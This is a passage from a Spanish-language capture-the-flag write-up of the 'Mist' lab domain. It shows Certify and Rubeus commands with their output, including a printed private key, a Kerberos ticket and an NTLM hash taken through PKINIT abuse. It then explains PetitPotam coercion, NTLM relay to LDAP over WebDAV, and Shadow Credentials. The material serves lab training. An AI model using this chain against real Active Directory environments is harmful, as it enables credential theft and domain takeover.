                                      NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERSS-1-5-9
      Object Control Permissions
        Owner                       : MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteOwner Principals       : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteDacl Principals        : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteProperty Principals    : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519

    CA Name                               : DC01.mist.htb\mist-DC01-CA
    Template Name                         : KerberosAuthentication
    Schema Version                        : 2
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_DOMAIN_DNS, SUBJECT_ALT_REQUIRE_DNS
    mspki-enrollment-flag                 : AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, KDC Authentication, Server Authentication, Smart Card Logon
    mspki-certificate-application-policy  : Client Authentication, KDC Authentication, Server Authentication, Smart Card Logon
    Permissions
      Enrollment Permissions
        Enrollment Rights           : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Domain Controllers       S-1-5-21-1045809509-3006658589-2426055941-516
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
                                      MIST\Enterprise Read-only Domain ControllersS-1-5-21-1045809509-3006658589-2426055941-498
                                      NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERSS-1-5-9
      Object Control Permissions
        Owner                       : MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteOwner Principals       : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteDacl Principals        : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteProperty Principals    : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519

    CA Name                               : DC01.mist.htb\mist-DC01-CA
    Template Name                         : UserAuthentication
    Schema Version                        : 2
    Validity Period                       : 99 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_ALT_REQUIRE_EMAIL, SUBJECT_REQUIRE_EMAIL, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Domain Users             S-1-5-21-1045809509-3006658589-2426055941-513
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
      Object Control Permissions
        Owner                       : MIST\Administrator            S-1-5-21-1045809509-3006658589-2426055941-500
        WriteOwner Principals       : MIST\Administrator            S-1-5-21-1045809509-3006658589-2426055941-500
                                      MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteDacl Principals        : MIST\Administrator            S-1-5-21-1045809509-3006658589-2426055941-500
                                      MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteProperty Principals    : MIST\Administrator            S-1-5-21-1045809509-3006658589-2426055941-500
                                      MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519

    CA Name                               : DC01.mist.htb\mist-DC01-CA
    Template Name                         : ComputerAuthentication
    Schema Version                        : 2
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_DNS
    mspki-enrollment-flag                 : AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Server Authentication
    mspki-certificate-application-policy  : Client Authentication, Server Authentication
    Permissions
      Enrollment Permissions
        Enrollment Rights           : MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Domain Computers         S-1-5-21-1045809509-3006658589-2426055941-515
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
      Object Control Permissions
        Owner                       : MIST\Administrator            S-1-5-21-1045809509-3006658589-2426055941-500
        WriteOwner Principals       : MIST\Administrator            S-1-5-21-1045809509-3006658589-2426055941-500
                                      MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteDacl Principals        : MIST\Administrator            S-1-5-21-1045809509-3006658589-2426055941-500
                                      MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteProperty Principals    : MIST\Administrator            S-1-5-21-1045809509-3006658589-2426055941-500
                                      MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519

    CA Name                               : DC01.mist.htb\mist-DC01-CA
    Template Name                         : ManagerAuthentication
    Schema Version                        : 2
    Validity Period                       : 99 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_COMMON_NAME
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email, Server Authentication
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email, Server Authentication
    Permissions
      Enrollment Permissions
        Enrollment Rights           : MIST\Certificate Services     S-1-5-21-1045809509-3006658589-2426055941-1132
                                      MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
      Object Control Permissions
        Owner                       : MIST\Administrator            S-1-5-21-1045809509-3006658589-2426055941-500
        WriteOwner Principals       : MIST\Administrator            S-1-5-21-1045809509-3006658589-2426055941-500
                                      MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteDacl Principals        : MIST\Administrator            S-1-5-21-1045809509-3006658589-2426055941-500
                                      MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteProperty Principals    : MIST\Administrator            S-1-5-21-1045809509-3006658589-2426055941-500
                                      MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519

    CA Name                               : DC01.mist.htb\mist-DC01-CA
    Template Name                         : BackupSvcAuthentication
    Schema Version                        : 2
    Validity Period                       : 99 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_COMMON_NAME
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : MIST\CA Backup                S-1-5-21-1045809509-3006658589-2426055941-1134
                                      MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
      Object Control Permissions
        Owner                       : MIST\Administrator            S-1-5-21-1045809509-3006658589-2426055941-500
        WriteOwner Principals       : MIST\Administrator            S-1-5-21-1045809509-3006658589-2426055941-500
                                      MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteDacl Principals        : MIST\Administrator            S-1-5-21-1045809509-3006658589-2426055941-500
                                      MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519
        WriteProperty Principals    : MIST\Administrator            S-1-5-21-1045809509-3006658589-2426055941-500
                                      MIST\Domain Admins            S-1-5-21-1045809509-3006658589-2426055941-512
                                      MIST\Enterprise Admins        S-1-5-21-1045809509-3006658589-2426055941-519



Certify completed in 00:00:09.9699584

```

El análisis de las plantillas disponibles mediante Certify.exe reveló que la plantilla User admite el uso de
Client Authentication, lo que la convierte en un vector idóneo para la obtención de un certificado válido
asociado  a  la  identidad  de  brandon.keywarp. A  partir  de  esta  plantilla,  se  procedió  a  generar  tanto  el
certificado como la clave privada correspondientes, elementos esenciales  para la explotación  del flujo
PKINIT descrito previamente.

```text
PS C:\xampp\htdocs\herramientas> .\Certify.exe request /user:Brandon.Keywarp /ca:DC01.mist.htb\mist-DC01-CA /template:user

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.1.0

[*] Action: Request a Certificates

[*] Current user context    : MIST\Brandon.Keywarp
[*] No subject name specified, using current context as subject.

[*] Template                : user
[*] Subject                 : CN=Brandon.Keywarp, CN=Users, DC=mist, DC=htb

[*] Certificate Authority   : DC01.mist.htb\mist-DC01-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 61

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAutj2Me81z/WOhe/rfxY5JJONKFRPhHq6olAW6X5l7WAFqBAr
Seo45H5GsTjKT5pUhm8XJjgK/N+n27BIpdFhdNEG6d8qpzCUAqqDvbXxvdLP23B/
uibDGm2FlulAiU5fkEYsMZCZyZFnfrpAE8dEzdjRYftF8fz+9nqcQbVEGru94jku
3hs2/qPkHBNAUUhFw3kd9n5J0E1DCxq0qiyUkU2cvzuAdsIftiGhtGS4CGaf4G0B
DvVYk01bVRSdSZhlPrt3FtOs84Vew/kJCrNFdnDWH1VLO1B+/nZzHvpaaNI496xg
v0Ls3+FbJImuSt/7mVGaDrQH1rWoAysuW+XurQIDAQABAoIBAFP1tENh8zNca0vC
MHct/EV0TCTIJeco4v6WsIUBeDm/QStxAJK5PhFmsMtn8njsp3i1KJjS7BUPRzVP
tIVWXc2JM+sZjegMyyWbi5FO1a7vsNkxZyO10Uvp1PKoI4jPf9+ruKYZDRHnVbM7
bBm3HDLHb+bwa1C+167YD6jzFARSfKDZHdmnzypbx3aOhG40k7FuWaH5OJluKsUA
85mW957p3842kmEXszhmvwUjZ/Bc0VA8+Ro3RL3RWOhZgPCsOJnNHfUpkeiyX8gy
5sLCz2N7vNRCgIDJ9z8pgh49oV6y4pyVSJMQUMqt4mKqSkX8YpAjHvfaEfa3bU4c
/LdinD0CgYEAwiot5ZgZYMBS8XNpmSTRpgKwzbmv6Gxb4cuEV+oZsnTsQrvAIYak
B0HtbmwgLGsbLYPVneeR3hNxep568ua5aIKiXuYqc4msfn0jHQDILvpNTYeS+8Wt
k6KTWdSk3NXP8pVKdIfYkcXwN20/+rhSDPLqsKseFgOqHj2MWQyAX/8CgYEA9lo5
CkKKqFEeoC1B0vIAv3cMUXOkkiKS14Gjn2CcbkBtAui2gQ+V5BYg7J4xveNWFvr+
HAaw5hDZPM0B2T1rk6CoHR3YRSfHJ9UboaoXKPazQsVMepmuoyCy2ajqeXWovAFR
Q/yS0rDfXtdH64A02+l9E/EC//YH7i4XHqQZMVMCgYEAnHV0qpAX0xjnPV1s+FTt
A0MjyYMZtsaqe5aNvHIN5vnE8DlupxVh099SPiqu+lwMeG7FkgpqRnOQe+h81oMJ
YKfzw1jhWFzWPM8Fnndk2EYmSJU44dz29AKLjlWFy9YXTTjz2FcnMsA3w9IrPhON
OpX8fARHqCGn0dpy38btI20CgYBdGE9B30+Ct9T49uFPFADQWe6fwTHJv6L6KZVp
nxq+Vz5awRJmxzr/jJU4lbd6aLSZzpPEh4rGBkvxvA8cxycmDKo7BpI54ARUuyXL
+/jwk/m+G80A756dKrgrpLem2p2/HkhVhtb9I7Xlozkcd8CB8kRACu31SEZK7cPy
4lRa3QKBgDMryBJqcCkPoLl1knZ1vtdp6oAZZbVIdnsrhV1lRnFWDxeztrnAkt0B
m3+jQbyUYWWFcDa6w2tcOUBe4souvLh2w4xBIEi/8z21m4doVYErJE2FKPq+RkeN
EBOwX9oEKgKwe2m5RYMYmexhOKdFKQ7Q4za0dcuLRbqef6TFBAEV
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGDzCCBPegAwIBAgITIwAAAD2uBJxZfkVcrgAAAAAAPTANBgkqhkiG9w0BAQsF
ADBCMRMwEQYKCZImiZPyLGQBGRYDaHRiMRQwEgYKCZImiZPyLGQBGRYEbWlzdDEV
MBMGA1UEAxMMbWlzdC1EQzAxLUNBMB4XDTI2MDMyNTIwMTU0MloXDTI3MDMyNTIw
MTU0MlowVTETMBEGCgmSJomT8ixkARkWA2h0YjEUMBIGCgmSJomT8ixkARkWBG1p
c3QxDjAMBgNVBAMTBVVzZXJzMRgwFgYDVQQDEw9CcmFuZG9uLktleXdhcnAwggEi
MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC62PYx7zXP9Y6F7+t/Fjkkk40o
VE+EerqiUBbpfmXtYAWoECtJ6jjkfkaxOMpPmlSGbxcmOAr836fbsEil0WF00Qbp
3yqnMJQCqoO9tfG90s/bcH+6JsMabYWW6UCJTl+QRiwxkJnJkWd+ukATx0TN2NFh
+0Xx/P72epxBtUQau73iOS7eGzb+o+QcE0BRSEXDeR32fknQTUMLGrSqLJSRTZy/
O4B2wh+2IaG0ZLgIZp/gbQEO9ViTTVtVFJ1JmGU+u3cW06zzhV7D+QkKs0V2cNYf
VUs7UH7+dnMe+lpo0jj3rGC/Quzf4Vskia5K3/uZUZoOtAfWtagDKy5b5e6tAgMB
AAGjggLpMIIC5TAXBgkrBgEEAYI3FAIECh4IAFUAcwBlAHIwKQYDVR0lBCIwIAYK
KwYBBAGCNwoDBAYIKwYBBQUHAwQGCCsGAQUFBwMCMA4GA1UdDwEB/wQEAwIFoDBE
BgkqhkiG9w0BCQ8ENzA1MA4GCCqGSIb3DQMCAgIAgDAOBggqhkiG9w0DBAICAIAw
BwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFO3DsI7cMnfXo30Pa/yQgyp5
cZZDMB8GA1UdIwQYMBaAFAJHtA9/ZUDlwTbDIo9S3fMCAFUcMIHEBgNVHR8Egbww
gbkwgbaggbOggbCGga1sZGFwOi8vL0NOPW1pc3QtREMwMS1DQSxDTj1EQzAxLENO
PUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1D
b25maWd1cmF0aW9uLERDPW1pc3QsREM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlv
bkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBuwYI
KwYBBQUHAQEEga4wgaswgagGCCsGAQUFBzAChoGbbGRhcDovLy9DTj1taXN0LURD
MDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZp
Y2VzLENOPUNvbmZpZ3VyYXRpb24sREM9bWlzdCxEQz1odGI/Y0FDZXJ0aWZpY2F0
ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRob3JpdHkwMwYDVR0R
BCwwKqAoBgorBgEEAYI3FAIDoBoMGEJyYW5kb24uS2V5d2FycEBtaXN0Lmh0YjBP
BgkrBgEEAYI3GQIEQjBAoD4GCisGAQQBgjcZAgGgMAQuUy0xLTUtMjEtMTA0NTgw
OTUwOS0zMDA2NjU4NTg5LTI0MjYwNTU5NDEtMTExMDANBgkqhkiG9w0BAQsFAAOC
AQEArUeH4EAE6EPmGMlVNBpAFkwRWDdmFO0qMqrs5UuD31NQqx+licCkpEHyJYKK
cbvdJjyA8v0GGrukVZs2keUwldfKfWlaqDc+FrbAu38gUvCexQws0kO/JqMNX44h
8GsZbZAqIzNqNM3R/2TAeqEOjmliINe/KoxOD9ymgKkozSDv752P5pZuOIjKGVeV
El4RUurQgRmM27ZyqL3ETw/qkTgQprtDpvvYZigUN+S3Ighqx8a3fU4x6m3tzSe1
aGkX/Iv/Cm/dzVfOqLgDCmBCE2Vge1hSF7CWeOcmQc/wPcPL0FzKQSo3+SnBvzUQ
XBZ7dj8zO5PMeD3i6g2FyQyxIw==
-----END CERTIFICATE-----


[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx



Certify completed in 00:00:12.0941978
```

Una vez generados, ambos artefactos fueron combinados en un único archivo cert.pem, que posteriormente
se  transformó  en  un  contenedor  cert.pfx  siguiendo  las  instrucciones  proporcionadas  por  Certify.  Este
proceso  no  requiere  contraseña,  ya  que  el  objetivo  es  disponer  de  un  certificado  utilizable  de  forma
inmediata para autenticación Kerberos basada en claves públicas.

Con  el  archivo  PFX  preparado,  se  empleó  Rubeus.exe  para  ejecutar  la  cadena  completa  de  abuso  de
PKINIT. La herramienta llevó a cabo, de manera automatizada, los pasos previamente analizados: inició
una  autenticación  PKINIT,  recibió  un  AS-REP  que  contenía  tanto  el  TGT  como  el  session  key,  y
posteriormente emitió una solicitud U2U. Gracias a la posesión de la clave privada asociada al certificado,
Rubeus pudo descifrar el session key y, con él, el PAC incluido en el TGS-REP, extrayendo finalmente el
hash NTLM del usuario.

```text
PS C:\xampp\htdocs\herramientas> .\Rubeus.exe asktgt /user:Brandon.Keywarp /certificate:C:\xampp\htdocs\herramientas\cert.pfx /getcredentials /show /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3

[*] Action: Ask TGT

[*] Got domain: mist.htb
[*] Using PKINIT with etype rc4_hmac and subject: CN=Brandon.Keywarp, CN=Users, DC=mist, DC=htb
[*] Building AS-REQ (w/ PKINIT preauth) for: 'mist.htb\Brandon.Keywarp'
[*] Using domain controller: 192.168.100.100:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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

  ServiceName              :  krbtgt/mist.htb
  ServiceRealm             :  MIST.HTB
  UserName                 :  Brandon.Keywarp (NT_PRINCIPAL)
  UserRealm                :  MIST.HTB
  StartTime                :  3/25/2026 1:33:35 PM
  EndTime                  :  3/25/2026 11:33:35 PM
  RenewTill                :  4/1/2026 1:33:35 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  QXBdr7t3TLlNgMlraH7NjA==
  ASREP (key)              :  C9CDD6935BE654711249FC0D1D868738

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : DB03D6A77A2205BC1D07082740626CC9
```

Este resultado constituye un punto de inflexión en la intrusión, ya que disponer del hash NTLM permite
autenticarse  frente  a  múltiples  servicios  del  dominio  y  utilizar  herramientas  ofensivas  con  plena
funcionalidad.  Para  validar  la  integridad  del  hash  obtenido,  se  ejecutó  netexec  nuevamente,  esta  vez
autenticando  explícitamente  como  brandon.keywarp.  La  autenticación  exitosa  confirmó  la  validez  del
hash y habilitó la siguiente fase de enumeración y movimiento lateral dentro del dominio.

<img src="assets/26.png">

<p align="center"><strong><u>Gaining Access as MS01$</u></strong></p>

Con  el  hash  NTLM  de  brandon.keywarp  ya  en  nuestro  poder,  se  procedió  a  realizar  una  serie  de
comprobaciones  orientadas  a  identificar  configuraciones  de  dominio  susceptibles  de  abuso.  Entre  ellas
destacó una especialmente crítica: la desactivación de LDAP Signing en el controlador de dominio. Esta
configuración, aún presente en numerosos entornos corporativos, abre la puerta a ataques de NTLM relay
siempre que se consiga forzar la autenticación NTLM de un usuario o servicio hacia un endpoint controlado
por el atacante.

<img src="assets/27.png">

La lógica del ataque es clara: si el controlador de dominio acepta solicitudes LDAP sin firma, cualquier
credencial  NTLM  capturada  mediante  coerción  puede  ser  retransmitida  directamente  al  DC  para
autenticarse frente a LDAP. En un escenario donde LDAP Signing estuviera habilitado, el DC exigiría que
la solicitud estuviera protegida mediante un session key válido, lo que imposibilitaría el relay salvo que se
dispusiera  de  la  clave  de  sesión  del  usuario  objetivo.  Dado  que  únicamente  poseemos  la  capacidad  de
autenticarnos  como  brandon, la  desactivación  de  LDAP  Signing  constituye  un vector  de  ataque de  alto
valor estratégico.

Para  materializar  la  coerción  de  autenticación  NTLM,  se  consideró  el  uso  de  PetitPotam,  un  exploit
ampliamente conocido por su capacidad para inducir autenticaciones NTLM mediante el abuso de la API
MS-EFSRPC. Sin embargo, la variante original del ataque opera sobre SMB, y en este entorno el SMB
Signing  se  encuentra  habilitado  en  el  controlador  de  dominio,  lo  que  impide  la  retransmisión  de
credenciales capturadas. Esta limitación puede verificarse fácilmente ejecutando el exploit y analizando la
salida de la herramienta de relay, que no recibirá ningún intento de autenticación válido.

A pesar de ello, PetitPotam sigue siendo útil como mecanismo de coerción, siempre que se combine con un
canal  adecuado  para  el  relay.  Para  ello,  se  optó  por  emplear  la  versión  en  Python del  exploit  junto  con
ntlmrelayx de Impacket. Antes de iniciar el ataque, fue necesario exponer nuestro listener al controlador
de dominio a través del túnel previamente establecido con Chisel, habilitando así la visibilidad del host
atacante dentro del segmento interno.

Con  el  túnel  operativo,  se  lanzó  ntlmrelayx  con  soporte  para  SMB2,  configurado  para  retransmitir
cualquier  autenticación  NTLM  entrante  hacia  el  servicio  LDAP  del  controlador  de  dominio.  Este  paso
constituye la base del ataque: si se consigue inducir una autenticación NTLM desde cualquier máquina del
dominio  hacia  nuestro  endpoint,  ntlmrelayx  podrá  retransmitirla  al  DC  y  obtener  acceso  LDAP  bajo  la
identidad del usuario víctima.

<img src="assets/28.png">

Tras  configurar  ntlmrelayx  con  soporte  SMB2  a  través  del  túnel  establecido,  se  procedió  a  ejecutar
PetitPotam, especificando nuestra dirección IP como listener y habilitando todas las pipes disponibles para
maximizar las posibilidades de coerción.

<img src="assets/29.png">

El análisis de la salida generada por ntlmrelayx confirmó la hipótesis inicial: el ataque fracasó debido a
que el SMB Signing se encuentra habilitado en el controlador de dominio, lo que impide la retransmisión
de autenticaciones NTLM capturadas.

A modo de referencia, si el mismo intento de autenticación se dirigiera hacia MS01, el ataque sería viable,
ya  que  dicho  host  no  implementa  SMB  Signing;  sin  embargo,  los  machine  accounts  no  pueden  iniciar
sesiones interactivas sobre recursos de red, por lo que este vector no resulta aprovechable.

<img src="assets/30.png">

Ante esta limitación, el foco estratégico se desplazó nuevamente hacia MS01, un sistema ya comprometido,
pero  sobre  el  cual  aún  no  se  disponía  de  privilegios  elevados.  Una  vía  factible  para  obtener  control
administrativo  sobre  este host  consiste  en  comprometer  su cuenta  de  máquina  (MS01$).  Si  se  lograra
obtener un ticket de servicio para el usuario Administrator sobre el servicio CIFS de MS01, se habilitaría
un acceso privilegiado al sistema.

Aunque  el  relay  SMB  hacia  el  controlador  de  dominio  está  bloqueado  por  la  firma  obligatoria,  MS01
presenta  una  característica  especialmente  relevante:  al  tratarse  de  una  instalación  de  Windows  Server,
incorpora  de  forma  nativa  el  servicio  WebDAV,  componente  integrado  en  IIS. WebDAV  permite  a  los
clientes  interactuar  con  recursos  remotos  de  forma  análoga  a  los  network  shares,  lo  que  implica  que
Windows utilizará NTLM o Kerberos para autenticarse automáticamente al acceder a un recurso WebDAV.

<img src="assets/31.png">

Este  detalle  es  crucial.  Si  se  consigue  coaccionar  una  autenticación  NTLM  sobre  HTTP,  el  tráfico
resultante  puede  ser  retransmitido  hacia  el  controlador  de  dominio  a  través  de  LDAP,  eludiendo  por
completo las restricciones impuestas por SMB Signing. En otras palabras, WebDAV constituye un canal
alternativo que permite NTLM relay incluso en entornos donde SMB Signing está correctamente habilitado.

Una vez autenticados en el DC como MS01$, se abre un vector de escalada particularmente potente: la
posibilidad de agregar Shadow Credentials para la cuenta de máquina. Según el análisis previo realizado
con BloodHound, MS01$ pertenece al grupo Domain Computers, el cual posee permisos para inscribirse
en  las  plantillas  MACHINE  y  COMPUTERAUTHENTICATION,  utilizadas  por  los  equipos  del
dominio para autenticarse en la red. La manipulación de estas plantillas permite introducir claves públicas
controladas  por  el  atacante,  habilitando  autenticación  persistente  y  completamente  sigilosa  como  la
máquina comprometida.

<img src="assets/32.png">

